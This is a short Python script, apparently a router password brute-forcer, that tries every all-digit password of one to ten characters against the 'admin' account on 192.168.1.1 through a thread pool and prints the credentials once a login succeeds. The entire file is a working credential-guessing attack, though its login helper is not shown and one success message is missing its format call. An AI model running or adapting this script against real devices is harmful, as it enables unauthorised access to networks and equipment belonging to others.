import string
import sys
from multiprocessing.pool import ThreadPool

from helper import (
    login, 
    is_success,
    create_wordlist
)

pool = ThreadPool(processes=2)
RUN = 0

def main():

    host = '192.168.1.1'
    username = 'admin'
    chars_set = string.digits

    for password in create_wordlist(chars_set, 1, 10):
        if pool._state != RUN:
            break
        pool.apply_async(login, [host, username, password], callback=thread_callback)


def thread_callback(result):
    response = result.get('response')
    username = result.get('username')
    password = result.get('password')
    if is_success(response):
        print('{} passed !')
        print('------------------------------------')
        print('username:', username)
        print('password:', password)
        print('------------------------------------')
        pool.terminate()
    else:
        print('{} not passed.'.format(password))


if __name__ == '__main__':
    main()
